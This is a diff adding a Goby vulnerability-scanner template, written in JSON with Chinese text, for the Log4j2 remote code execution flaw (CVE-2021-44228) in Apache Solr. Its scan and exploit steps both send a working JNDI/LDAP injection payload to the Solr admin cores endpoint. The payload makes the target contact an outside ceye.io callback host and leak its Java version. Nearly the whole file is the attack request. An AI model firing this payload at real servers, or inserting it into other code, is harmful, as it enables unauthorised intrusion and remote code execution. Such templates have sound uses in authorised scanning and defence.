@@ -1,0 +1,103 @@
+{
+      "Name": "Apache Solr Log4j2远程代码执行漏洞（CVE-2021-44228）",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "APP=\"Solr\"",
+      "Description": "Apache Log4j2是一个Java的日志组件，在特定的版本中由于其启用了lookup功能，从而导致产生远程代码执行漏洞。",
+      "Product": "Apache Log4j2 2.0-beta9 - 2.15.0",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/solr/admin/cores?action=$%7Bjndi:ldap://$%7Bsys:java.version%7D.amth5e.ceye.io%7D",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "400",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "ldap",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/solr/admin/cores?action=$%7Bjndi:ldap://$%7Bsys:java.version%7D.amth5e.ceye.io%7D",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
+                        },
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "400",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "ldap",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2022-05-26 22:18:46",
+      "GobyVersion": "1.9.325"
+}
